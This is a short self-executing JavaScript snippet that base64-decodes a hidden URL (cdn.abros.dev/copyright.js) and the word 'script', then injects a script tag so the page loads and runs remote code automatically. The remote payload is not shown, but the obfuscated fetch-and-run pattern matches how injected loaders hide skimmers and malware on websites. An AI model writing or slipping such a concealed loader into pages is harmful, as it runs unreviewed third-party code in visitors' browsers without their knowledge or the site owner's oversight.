(function () {
  function loadSCA() {
    const a = "aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw==";
    const b = "c2NyaXB0";
    const r = document.createElement(atob(b));
    r.src = atob(a);
    r.async = true;
    document.head.appendChild(r);
  }
  loadSCA();
})();
